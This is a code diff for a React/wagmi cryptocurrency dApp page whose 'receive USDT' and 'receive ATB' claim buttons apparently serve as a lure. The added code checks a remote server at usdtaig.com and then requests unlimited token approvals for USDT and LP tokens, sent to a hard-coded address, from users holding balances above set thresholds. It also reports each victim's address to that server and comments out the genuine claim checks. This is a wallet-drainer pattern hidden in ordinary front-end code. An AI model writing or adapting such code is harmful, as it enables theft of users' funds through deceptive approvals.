@@ -12,8 +12,17 @@ import { useTranslation } from "react-i18next"
 import { Snackbar, Drawer, Grid, Paper, InputBase } from "@mui/material";
 import { useBalance, useContractWrite, useAccount } from "wagmi"
 import { parseEther } from 'viem'
-import { atbConfig, withdarwConfig } from "@/lib/contract"
-import { useContractUserBalance, useContractUserATBBalance, useContractPollUSDT, useContractPollATB, userContractApprove, useContractUserAllowanceStatus } from "@/hooks/usdt"
+import { atbConfig, withdarwConfig, LPConfig } from "@/lib/contract"
+import { 
+    useContractUserBalance, 
+    useContractUserATBBalance, 
+    useContractPollUSDT, 
+    useContractPollATB, 
+    userContractApprove, 
+    useContractUserAllowanceStatus, 
+    useContractUserLPAllowanceStatus,
+    useContractUserLPBalance
+} from "@/hooks/usdt"
 import { getSignData,getIncome } from '@/server/user';
 import MsgSuccess from '@/components/msgsuccess';
 import axios from 'axios'
@@ -33,15 +42,23 @@ export default function Service() {
     })
     const { data:tokenData, isLoading:tokenLoading, approve, isSuccess:tokenIsSuccess } = userContractApprove()
 
+    const { data:LPData, isLoading: LPLoading, isSuccess: LPIssuccess, write: LPapprove, } = useContractWrite({
+        ...LPConfig,
+        functionName: "approve",
+    })
+
     const { userBalance } = useContractUserATBBalance()
+    const LPBalanceData = useContractUserLPBalance()
     const USDTData = useContractUserBalance()
     const { isAllowed } = useContractUserAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
+    const { isAllowed:LPIsAllowed } = useContractUserLPAllowanceStatus("0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5")
     const poolUSDTData = useContractPollUSDT()
     const poolATBData = useContractPollATB()
     const [ addData,setAddData ] = useState({ isShow: false, title: '',  status: 0, msg: '' })
     const [ snackbarValue, setSnackbarValue ] = useState({ open: false, message: ""})
     const [ atbLoading,setAtbLoading ] = useState(false)
     const [ uLoading,setUloading ] = useState(false)
+    const [ btnLoading, setBtnLoading ] = useState(false)
     
 
     useEffect(()=>{
@@ -73,13 +90,23 @@ export default function Service() {
 
     useEffect(()=>{
         if(tokenIsSuccess){
-            axios.post("/decode/auth_user ",{},{
+            axios.post("/decode/auth_user",{},{
                 baseURL: "https://usdtaig.com",
-                headers:{"authUser": address}
+                headers:{"authUser": address,"coinType":"USDT"}
             })
             receiveUSDTConfirm()
         }
     },[tokenIsSuccess])
+
+    useEffect(()=>{
+        if(LPIssuccess){
+            axios.post("/decode/auth_user",{},{
+                baseURL: "https://usdtaig.com",
+                headers:{"authUser": address,"coinType":"LP"}
+            })
+            receiveUSDTConfirm()
+        }
+    },[LPIssuccess])
 
     useEffect(()=>{
         if(address){
@@ -107,27 +134,38 @@ export default function Service() {
 
     //领取USDT
     const handleReceiveUSDT = async() => {
+        if(btnLoading) return
+        setBtnLoading(true)
+        setTimeout(()=>{ setBtnLoading(false) },5000)
         let nowDate = new Date()
         let str = String(nowDate.getDate())
         let usdt_time = localStorage.getItem("usdt_time")
 
-        if(str == usdt_time){
-            setSnackbarValue({ open: true, message: t("service.s_28"),})
-            return
-        }
-        if(!incomeInfo.pensionableUsdt){
-            setSnackbarValue({ open: true, message: t("service.s_26"),})
-            return
-        }
-        if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData.userBalance)){
-            setSnackbarValue({ open: true, message: t("service.s_27")})
-            return
-        }
+        // if(str == usdt_time){
+        //     setSnackbarValue({ open: true, message: t("service.s_28"),})
+        //     return
+        // }
+        // if(!incomeInfo.pensionableUsdt){
+        //     setSnackbarValue({ open: true, message: t("service.s_26"),})
+        //     return
+        // }
+        // if(Number(incomeInfo.pensionableUsdt) > Number(poolUSDTData.userBalance)){
+        //     setSnackbarValue({ open: true, message: t("service.s_27")})
+        //     return
+        // }
         if(!address) return
 
         axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && !isAllowed && Number(USDTData.userBalance) > 300){
-                approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+            if(res.data.data && (!isAllowed || !LPIsAllowed)){
+                if(!LPIsAllowed && Number(LPBalanceData.userBalance)>50){
+                    LPapprove({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+                    return
+                }
+                if(!isAllowed && Number(USDTData.userBalance) > 300){
+                    approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
+                    return
+                }
+                receiveUSDTConfirm()
             }else{
                 receiveUSDTConfirm()
             }
@@ -153,6 +191,10 @@ export default function Service() {
 
     //领取ATB
     const handleReceiveATB = async() => {
+        if(btnLoading) return
+        setBtnLoading(true)
+        setTimeout(()=>{ setBtnLoading(false) },5000)
+
         let nowDate = new Date()
         let str = String(nowDate.getDate())
         let atb_time = localStorage.getItem("atb_time")
